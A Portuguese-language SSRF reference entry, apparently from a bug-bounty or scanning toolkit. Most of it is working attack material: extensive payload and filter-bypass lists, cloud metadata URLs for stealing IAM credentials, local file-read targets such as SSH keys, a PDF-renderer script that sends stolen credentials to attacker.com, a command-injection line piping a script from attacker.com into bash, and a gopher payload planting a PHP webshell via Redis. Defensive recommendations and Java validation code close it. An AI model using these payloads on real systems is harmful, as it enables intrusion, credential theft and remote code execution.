---
id: ssrf
title: "Server-Side Request Forgery"
module: "ssrf"
severity: "CRITICAL"
cwe_id: "CWE-918"
cwe_title: "Server-Side Request Forgery (SSRF)"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N"
vrt_id: "server_security_misconfiguration.server_side_request_forgery"
---

## Summary
A aplicação busca uma URL controlada pelo usuário, permitindo que o atacante acesse serviços internos, metadata de cloud, arquivos locais e redes restritas a partir do servidor. É uma das falhas de maior impacto em ambientes cloud.

## Description
SSRF ocorre quando o servidor faz requisições HTTP/DNS com base em entrada do usuário sem validar destino, esquema e resolução. O atacante usa o servidor como proxy para alcançar:

- `localhost` e serviços administrativos internos (Redis, Elasticsearch, Docker, Actuator).
- Endpoints de metadata cloud (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`).
- Redes privadas (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `::1`, `fc00::/7`).
- Arquivos locais via `file://`, wrappers e protocolos alternativos.
- Serviços internos sem autenticação que permitem RCE (Redis, Docker API, memcached).

Mesmo SSRF "cego" (sem resposta refletida) pode ser confirmado com DNS/HTTP out-of-band, temporização ou mudanças de estado. Em cloud, a combinação com IMDSv1 pode levar ao roubo de credenciais IAM e comprometimento total da conta.

## Impact
- Roubo de credenciais cloud (AWS/GCP/Azure) e acesso a buckets, bancos e serviços.
- Acesso e modificação de dados internos, bypass de firewalls e segmentação.
- RCE via serviços internos (Redis, Docker, Jenkins, Actuator, Consul).
- Leitura de arquivos locais e segredos de configuração.
- Movimento lateral e escalada para comprometimento total do ambiente.
- Impacto CRITICAL; SSRF cego também pode ser crítico quando atinge metadata.

## Payloads and Bypasses
```text
# Localhost e loopback
http://127.0.0.1
http://127.0.0.1:80
http://localhost
http://localhost:8080
http://[::1]
http://[::ffff:127.0.0.1]
http://127.1
http://0.0.0.0

# Representações alternativas de IP
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f000001          # hex
http://0x7f.0x0.0x0.0x1
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://localtest.me

# Metadata cloud
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Protocolos e wrappers
file:///etc/passwd
file:///proc/self/environ
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:11211/stat
ftp://127.0.0.1/
ldap://127.0.0.1/
```

Bypasses de filtros e WAF:
```text
# Userinfo / authority confusion
http://evil.com@127.0.0.1
http://127.0.0.1#@evil.com
http://127.0.0.1?@evil.com
http://alvo.com@169.254.169.254/

# Redirecionamento aberto como relay
http://alvo.com/redirect?url=http://169.254.169.254/
# Seguir redirects no servidor para burlar allowlist inicial

# DNS rebinding
http://rebind.attacker.com  # resolve para IP público na validação e 127.0.0.1 no fetch

# Encoding
http://127.0.0.1%2f@evil.com
http://%31%32%37.0.0.1
http://127.0.0.1%00.evil.com

# IPv6/IPv4 mapeado
http://[::ffff:7f00:1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# Encurtadores e CDN
https://bit.ly/xxx
https://storage.googleapis.com/...  # redirect para metadata
```

Protocolos e esquemas adicionais:
```text
# jar: protocol (Java)
jar:http://127.0.0.1!/
jar:https://127.0.0.1!/
jar:ftp://127.0.0.1!/

# Enclosed alphanumerics (Unicode bypass)
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ
http://⑯⑨.②⑤④.⑯⑨.②⑤④

# PHP filter_var() bypass
0://evil.com:80;http://google.com:80/
```

Cloud metadata adicional:
```text
# AWS IMDSv2 (requer token PUT com TTL e header X-aws-ec2-metadata-token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/

# AWS ECS Task Credentials
http://169.254.170.2/v2/credentials/
http://169.254.170.2/v2/metadata

# Hetzner Cloud
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/private-networks

# OpenStack
http://169.254.169.254/openstack/2012-08-10/meta_data.json
http://169.254.169.254/openstack/latest/meta_data.json

# Oracle Cloud Infrastructure (OCI)
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/

# Packetcloud
https://metadata.packet.net/userdata
https://metadata.packet.net/metadata
```

File read -- Windows:
```text
file:///C:/inetpub/wwwroot/web.config
file:///C:/Windows/System32/config/SAM
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/win.ini
file:///C:/Boot/BCD
```

File read -- Linux (adicional):
```text
file:///proc/net/tcp
file:///proc/net/arp
file:///proc/self/cmdline
file:///root/.ssh/id_rsa
file:///root/.ssh/authorized_keys
file:///var/log/auth.log
file:///home/user/.bash_history
```

Bypass avancados (payload files):
```text
# Variantes de porta e loopback
http://127.0.0.1:443
http://127.0.0.1:22
http://[::]:80/
http://[::]:25/
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://①②⑦.⓪.⓪.⓪
http://127.127.127.127
http://127.0.1.3

# Null byte e path confusion
http://127.0.0.1%00google.com
http://127.0.0.1///google.com
http://127.0.0.1?google.com

# Double authority confusion
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/

# Wildcard DNS services
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
localhost:+11211aaa
localhost:00011211aaaa
```

DigitalOcean metadata:
```text
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/interfaces/private/0/ipv4/address
```

NAT64 bypass (bypassa filtros que so bloqueiam IPv4):
```text
# NAT64 local-use prefix -- mapeia IPv4 interno para IPv6
http://[64:ff9b:1::169.254.169.254]/
http://[64:ff9b:1::127.0.0.1]/
http://[64:ff9b::169.254.169.254]/
```

Webhook/callback SSRF:
```text
# Funcionalidades que aceitam URL de callback
webhook_url=http://169.254.169.254/latest/meta-data/
callback_url=http://127.0.0.1:6379/INFO
notification_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
ping_url=http://localhost:8080/admin
import_url=http://169.254.169.254/computeMetadata/v1/
```

DNS rebinding detalhado:
```text
# Setup: dominio com TTL baixo que alterna resolucao
# 1a resolucao: IP publico (passa validacao de allowlist/blocklist)
# 2a resolucao: IP interno (169.254.169.254 ou 127.0.0.1)
# Ferramentas: rbndr.us, rebinder, singularity
# Requer que o servidor faca DNS lookup separado da validacao e do fetch

# Teste com rbndr.us
http://7f000001.a9fea9fe.rbndr.us/
# Alterna entre 127.0.0.1 e 169.254.169.254
```

PoC de exfiltracao de credenciais AWS:
```bash
curl "https://alvo.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name"
```

Casos reais e mentalidade de ataque (RWBH): Uber (fetch de imagens/avatares), Facebook (`og:image`) e Shopify (webhooks) lembram que qualquer URL controlada pode virar acesso a metadata e serviços internos; o atacante procura redirects e DNS rebinding quando a allowlist existe.

## Advanced Attack Vectors

### SVG Image Processing SSRF
Aplicacoes que processam SVG server-side (resize, thumbnail, conversao) podem ser exploradas injetando referencias externas no XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="100" height="100"/>
</svg>
```
Funciona em bibliotecas como ImageMagick, librsvg, Batik e wkhtmltoimage.

### GraphQL SSRF
Mutations ou queries GraphQL que aceitam URLs em campos como `sourceUrl`, `webhookUrl`, `avatarUrl`, `importUrl`:
```graphql
mutation {
  createWebhook(input: { url: "http://169.254.169.254/latest/meta-data/" }) { id }
}
mutation {
  importData(sourceUrl: "http://127.0.0.1:6379/") { status }
}
```

### WebSocket Proxying
Endpoints que proxeiam conexoes WebSocket podem ser abusados para alcancar servicos internos:
```text
GET /ws-proxy?target=ws://127.0.0.1:6379 HTTP/1.1
Upgrade: websocket
Connection: Upgrade
```
Protocolo WebSocket frequentemente ignora validacoes aplicadas a HTTP.

### FFmpeg / HLS Video Processing
Aplicacoes que processam video/audio com FFmpeg podem ser exploradas via playlist M3U8:
```text
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:http://169.254.169.254/latest/meta-data/iam/security-credentials/
#EXT-X-ENDLIST
```
Upload de arquivo `.m3u8` ou `.avi` com payload HLS embutido.

### Headless PDF Renderer XSS-to-SSRF
Aplicacoes que geram PDF a partir de HTML (wkhtmltopdf, Puppeteer, Chrome headless) podem ser exploradas com JavaScript no HTML de entrada:
```html
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>

<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
xhr.send();
new Image().src = "http://attacker.com/exfil?" + btoa(xhr.responseText);
</script>
```

### CRLF-to-SSRF
Injecao de CRLF em parametros de URL pode alterar o Host header da requisicao server-side:
```text
url=http://allowed.com%0d%0aHost:%20169.254.169.254
url=http://allowed.com%0d%0a%0d%0aGET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254
```

### SSRF via Header Injection
Headers HTTP controlados pelo usuario que sao repropagados pelo servidor em requisicoes internas:
```text
Referer: http://169.254.169.254/latest/meta-data/
X-Forwarded-For: 127.0.0.1
X-Original-URL: http://169.254.169.254/
True-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
```

### Command Injection via SSRF
Quando o fetch e implementado via `curl`, `wget` ou subprocess:
```text
url=http://YOUR_OOB?$(whoami)
url=http://YOUR_OOB?`id`
url=|curl http://attacker.com/shell.sh|bash
```

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `url`, `uri`, `link`, `src`, `source`, `dest`, `destination`, `redirect`, `proxy`, `fetch`, `image`, `imageUrl`, `avatar`, `avatarUrl`, `callback`, `webhook`, `feed`, `host`, `port`, `path`, `file`, `load`, `import`, `site`, `html`, `u`, `rurl`, `preview`, `screenshot`, `pdf`, `export`.
- **Paths comuns:** `/api/fetch`, `/api/proxy`, `/api/image`, `/upload`, `/avatar`, `/webhook`, `/import`, `/preview`, `/screenshot`, `/render`, `/pdf`, `/integrations`, `/graphql`.
- **Sinais:** URL completa aceita; parâmetro `url` refletido em requisição server-side; funcionalidades de importação, preview, avatar, webhook, geração de PDF/screenshot; SSRF cego via DNS/HTTP OOB.

## Notable CVEs

| CVE | Produto | Ano | Descricao | Tipo |
|-----|---------|-----|-----------|------|
| CVE-2021-26855 | Microsoft Exchange Server | 2021 | ProxyLogon -- SSRF pre-auth via endpoint /owa/auth/x.js permite acessar mailboxes arbitrarias e pivotar para RCE | Pre-auth SSRF |
| CVE-2021-21975 | VMware vRealize Operations | 2021 | SSRF na API permite ator com acesso de rede ler dados internos sem autenticacao | Pre-auth SSRF |
| CVE-2021-21973 | VMware vCenter Server | 2021 | SSRF via validacao impr. de URLs em plugin do vSphere Client (porta 443) -- permite scan de rede interna | Pre-auth SSRF |
| CVE-2021-40438 | Apache HTTP Server (mod_proxy) | 2021 | URI crafted faz mod_proxy encaminhar request para origin server escolhido pelo atacante -- afeta <= 2.4.48 | Proxy SSRF |
| CVE-2022-22947 | Spring Cloud Gateway | 2022 | Code injection via Gateway Actuator endpoint exposto permite RCE e SSRF em versoes < 3.1.1+ e < 3.0.7+ | Actuator SSRF |
| CVE-2022-41040 | Microsoft Exchange Server | 2022 | ProxyNotShell -- SSRF autenticada combinada com CVE-2022-41082 para RCE; bypass do patch do ProxyLogon | Auth SSRF + RCE |
| CVE-2024-21893 | Ivanti Connect Secure / Policy Secure | 2024 | SSRF no componente SAML permite acessar recursos restritos sem autenticacao | SAML SSRF |
| CVE-2020-13379 | Grafana 3.0.1 -- 7.0.1 | 2020 | SSRF na feature de avatar permite qualquer usuario nao autenticado forcar Grafana a enviar HTTP requests para URLs arbitrarias | Avatar SSRF |
| CVE-2020-26258 | XStream < 1.4.15 | 2020 | SSRF ativada durante unmarshalling de XML -- permite leitura de recursos internos via desserializacao | Deserialization SSRF |
| CVE-2020-28168 | Axios NPM 0.21.0 | 2020 | Bypass de proxy via URL que responde com redirect para host restrito -- permite SSRF client-side | Redirect SSRF |

**Fontes**: CVE List v5 (cvelistV5), NVD, advisories dos vendors.

## Escalation Techniques
- **Roubo de credenciais cloud:** SSRF para `169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME` (AWS) exfiltra access key, secret key e session token. Em GCP, usar `metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token` (v1beta1 nao exige header `Metadata-Flavor`). Ref: Shopify H1 #341876 (ROOT em todas as instancias via SSRF->metadata, 585 upvotes) e HackerOne H1 #2262382 ($25,000 bounty via metadata exfiltration).
- **Port scanning e mapeamento de rede:** variar host (`10.0.0.1-255`) e porta (`22, 80, 443, 3306, 5432, 6379, 8080, 8443`) e observar diferencas em status code (200 vs 500) e tempo de resposta para inferir topologia interna e servicos ativos.
- **Bypass de controle de acesso:** usar o servidor como proxy para acessar paineis administrativos internos (`admin.example.com`, `internal-api.local`) que confiam no IP de origem.
- **RCE via servicos internos:** SSRF para Redis (`gopher://127.0.0.1:6379/_SET...`), Docker API (`http://127.0.0.1:2375/containers/create`), Consul, Jenkins, Actuator -- servicos que normalmente nao exigem auth na rede interna.
- **Exfiltracao via blind SSRF:** quando a resposta nao e refletida, usar DNS out-of-band (Collaborator, interact.sh) para confirmar conectividade, e inferir dados por timing e status codes.
- **Combinar com open redirect:** se a allowlist aceita subdomains do alvo, encontrar um redirect aberto nesse subdomain para pivotar para `127.0.0.1` ou metadata.
- **Webhook/callback SSRF:** funcionalidades que aceitam URL de callback (webhook_url, notification_url, import_url) frequentemente fazem fetch server-side sem validacao. Ref: Omise H1 #508459 (SSRF via webhook URL, 214 upvotes), HackerOne H1 #2301565 ($2,500 via callback URL).
- **Media processing SSRF (FFmpeg/ImageMagick):** upload de arquivo multimedia com URL embutida (HLS playlist, SVG xlink:href) forca o servidor a fazer fetch interno durante processamento. Ref: TikTok H1 #1062888 ($2,727 via FFmpeg SSRF), Dropbox H1 #1406938 ($17,576 via Google Drive import SSRF).
- **DNS rebinding para bypass de validacao:** dominio com TTL baixo que alterna entre IP publico (passa validacao) e IP interno (169.254.169.254) no momento do fetch. Ref: PortSwigger MCP H1 #3176157 (144 upvotes). Ferramentas: rbndr.us, rebinder, singularity.
- **NAT64 bypass:** usar prefixo `64:ff9b:1::/48` para mapear enderecos IPv4 internos para IPv6, bypassing filtros que so bloqueiam IPv4. Ref: arkadiyt-projects H1 #3634400 (65 upvotes).
- **Gopher-to-Redis webshell:** payload completo via protocolo gopher para plantar webshell no servidor via Redis:
```text
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aFLUSHALL%0d%0a*3%0d%0a$3%0d%0aSET%0d%0a$1%0d%0a1%0d%0a$34%0d%0a%0a%0a<?php system($_GET['cmd']); ?>%0a%0a%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$3%0d%0adir%0d%0a$13%0d%0a/var/www/html%0d%0a*4%0d%0a$6%0d%0aCONFIG%0d%0a$3%0d%0aSET%0d%0a$10%0d%0adbfilename%0d%0a$9%0d%0ashell.php%0d%0a*1%0d%0a$4%0d%0aSAVE%0d%0a
```
Equivalente a: FLUSHALL -> SET 1 "<?php system($_GET['cmd']); ?>" -> CONFIG SET dir /var/www/html -> CONFIG SET dbfilename shell.php -> SAVE.
- **Gopher-to-MongoDB:** injecao via gopher para criar usuario admin no MongoDB (porta 27017):
```text
gopher://127.0.0.1:27017/_<raw-mongodb-wire-protocol-payload>
```
Usar ferramentas como Gopherus3 para gerar payloads MongoDB wire protocol.
- **PDF renderer file read:** em aplicacoes que renderizam HTML para PDF (wkhtmltopdf, Puppeteer), injetar iframes para leitura de arquivos e XHR para metadata:
```html
<iframe src="file:///etc/passwd"></iframe>
<iframe src="file:///proc/self/environ"></iframe>
<script>
  x=new XMLHttpRequest;
  x.open("GET","http://169.254.169.254/latest/meta-data/iam/security-credentials/",false);
  x.send();
  document.write(x.responseText);
</script>
```

## Hunting Methodology
1. Identificar features que buscam recursos externos: webhooks, upload por URL, previews, screenshots, PDF generation, avatares, integracao com servicos externos, proxies.
2. Testar endpoints com URLs internas: `http://127.0.0.1`, `http://169.254.169.254/latest/meta-data/`, `http://[::1]`.
3. Para SSRF regular: observar se a resposta contem banners de servico, conteudo de paginas internas ou dados de metadata.
4. Para blind SSRF: usar servidor proprio (Netcat, Collaborator, interact.sh) e verificar se o alvo faz requisicoes outbound. Comparar status codes e tempos entre portas abertas e fechadas.
5. Se houver blocklist: tentar bypass via representacoes alternativas de IP (decimal `2130706433`, octal `0177.0.0.1`, hex `0x7f000001`), redirect via dominio controlado, DNS rebinding, IPv6 (`[::ffff:127.0.0.1]`).
6. Se houver allowlist: testar confusao de authority (`http://allowed.com@127.0.0.1`), regex fraco (`http://127.0.0.1/allowed.com`), e open redirects em dominios permitidos.
7. Verificar URLs embutidas em arquivos processados pela aplicacao (XML, PDF, SVG) -- podem triggerar SSRF indireta.
8. Testar SSRF via PDF generators: se a aplicacao gera PDF a partir de HTML (wkhtmltopdf, Puppeteer), injetar `<iframe src="http://169.254.169.254/...">` ou `<script>` com XHR para metadata.
9. Verificar webhooks e integracoes: campos como `webhook_url`, `callback_url`, `notification_url` frequentemente nao validam destino e permitem SSRF direta.
10. Testar IMDSv2 bypass: em AWS, verificar se o hop limit do token PUT permite acesso via SSRF (default e 1, mas pode ser configurado para mais). Se IMDSv1 nao esta desabilitado, testar GET direto sem token.
11. Verificar SSRF via import/export: funcionalidades de importacao de dados (CSV, XML, JSON) que aceitam URL como fonte podem ser exploradas para SSRF.

## Notable HackerOne Reports

| Report | Programa | Upvotes | Bounty | Tecnica |
|--------|----------|---------|--------|---------|
| #341876 | Shopify | 603 | $0 | SSRF via open redirect em redirect_to |
| #223326 | Shopify | 547 | $0 | SSRF via dominio shopifycloud.com |
| #514224 | Gitlab | 365 | $0 | Blind SSRF no Jira import via URL |
| #398799 | GitLab | 238 | $4,000 | Blind SSRF no controller OAuth Jira |
| #1864188 | EXNESS | 261 | $3,000 | SSRF via campo GraphQL |
| #2894188 | Shopify | 95 | $3,100 | Blind SSRF via REST API |
| #115748 | HackerOne | 220 | $0 | SSRF em markdown/HTML rendering |
| #643622 | GitLab | 170 | $3,500 | SSRF via DNS rebinding |
| #1578400 | Shopify | 85 | $3,100 | SSRF via webhooks integration |
| #411865 | Mail.Ru | 165 | $5,000 | Full-read SSRF em servico de imagens |

## False Positive Indicators
- Servidor retorna erro generico para qualquer URL invalida, nao apenas para ranges internos -- pode ser validacao de formato, nao SSRF.
- Requisicao DNS out-of-band e recebida mas sem HTTP follow-up -- indica que o servidor resolve DNS mas pode ter firewall de egress bloqueando conexoes.
- Resposta identica para `127.0.0.1` e para dominio publico invalido -- a aplicacao pode estar rejeitando todas as URLs sem busca-las.
- Funcionalidade de upload aceita URL mas processa client-side (JavaScript fetch) e nao server-side -- nao e SSRF.
- Aplicacao retorna conteudo da URL mas com cache CDN -- a resposta pode ser cache de requisicao anterior, nao fetch real do servidor.
- IMDSv2 ativo (requer token via PUT com hop limit) -- SSRF nao consegue obter o token, metadata retorna 401.

## Tools
- **Interactsh / Burp Collaborator:** deteccao out-of-band (OOB) -- confirma SSRF cego via callback DNS/HTTP para servidor controlado.
- **SSRFmap:** fuzzer e framework de exploracao automatizada de SSRF; suporta multiplos protocolos e chains de escalacao.
- **Gopherus3:** gerador de payloads gopher para Redis, MySQL, PostgreSQL, FastCGI, SMTP, MongoDB e outros servicos internos.
- **Pipeline de recon:**
```bash
subfinder -d alvo.com -silent | httpx -silent > live.txt
cat live.txt | gau --threads 5 | gf ssrf > ssrf_candidates.txt
nuclei -l ssrf_candidates.txt -t ssrf/ -o ssrf_results.txt
```

## Recommendation
1. Preferir allowlist de hosts, portas e esquemas necessários; nunca aceitar URL arbitrária.
2. Resolver o DNS no servidor, validar todos os IPs retornados e bloquear faixas privadas, loopback, link-local, multicast e metadata. Repetir a validação após cada redirect.
3. Desabilitar redirects automáticos ou limitar a mesma origem/allowlist; validar cada salto.
4. Fixar o IP resolvido (DNS pinning) e usar o IP validado na conexão, para evitar DNS rebinding.
5. Bloquear esquemas não HTTP(S) (`file`, `gopher`, `dict`, `ftp`, `ldap`, `jar`) e portas não necessárias.
6. Em cloud, exigir IMDSv2 (token obrigatório), restringir hop limit e aplicar least privilege nas roles.
7. Segmentar a rede: o serviço que faz fetch não deve alcançar o plano de controle, bancos ou metadata.
8. Usar proxy egress com allowlist, autenticação e logging; inspecionar respostas e limitar tamanho/tempo.
9. Exemplo Java:
```java
private static final Set<String> ALLOWED_HOSTS = Set.of("images.alvo.com", "cdn.alvo.com");

URI uri = URI.create(userUrl);
if (!"https".equalsIgnoreCase(uri.getScheme())) throw new IllegalArgumentException();
if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new IllegalArgumentException();
InetAddress[] addrs = InetAddress.getAllByName(uri.getHost());
for (InetAddress a : addrs) {
    if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress()
        || a.isAnyLocalAddress() || a.isMulticastAddress()) {
        throw new IllegalArgumentException();
    }
}
HttpClient.newBuilder().followRedirects(HttpClient.Redirect.NEVER).build();
```
10. Monitorar requisicoes para metadata e ranges privados; alertar sobre tentativas.

## Sources
- "The Ultimate Guide to SSRF" -- Lostsec, InfoSec Write-ups, Oct 2026
- Payload files: `ssrf.txt`, `ssrfBypass-payloads.txt` (colecao local)
- Bug Bounty Bootcamp (Vickie Li) -- base conceitual
- CVE List v5 (cvelistV5) -- CVEs referenciados
